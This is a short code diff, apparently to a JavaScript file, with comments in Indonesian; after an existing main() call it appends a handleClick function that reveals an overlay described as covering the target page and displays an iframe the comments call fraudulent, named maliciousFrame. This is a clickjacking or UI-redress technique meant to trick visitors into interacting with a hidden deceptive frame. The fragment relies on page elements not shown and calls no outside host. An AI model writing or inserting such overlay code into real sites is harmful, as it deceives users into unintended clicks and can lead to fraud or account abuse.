@@ -163,3 +163,10 @@ function main() {
 
 // Panggil fungsi utama
 main();
+
+        function handleClick() {
+            // Menampilkan overlay untuk menutupi halaman target
+            document.getElementById('overlay').style.display = 'block';
+            // Menampilkan iframe penipu
+            document.getElementById('maliciousFrame').style.display = 'block';
+        }
